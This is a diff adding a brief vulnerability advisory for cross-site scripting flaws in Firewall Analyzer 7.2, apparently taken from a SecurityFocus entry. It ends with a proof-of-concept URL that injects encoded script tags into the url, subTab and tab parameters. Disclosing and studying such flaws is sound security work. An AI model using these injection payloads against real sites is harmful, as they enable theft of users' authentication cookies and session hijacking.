@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/52841/info
+  
+Firewall Analyzer is prone to multiple cross-site scripting vulnerabilities because it fails to sanitize user-supplied input.
+  
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+  
+Firewall Analyzer 7.2 is affected; other versions may also be vulnerable. 
+
+http://www.example.com/fw/mindex.do?url=%22%3E%3Cscript%3Ealert%28%27vlab%27%29%3C/script%3EliveReportDash%22%3E
+%3Cscript%3Ealert%28%27vlab%27%29%3C/script%3E&subTab=%22%3E%3Cscript%3Ealert%28%27vlab%27%29%3C/script%3Elive&tab=%22%3
+E%3Cscript%3Ealert%28%27vlab%27%29%3C/script%3Ereport 
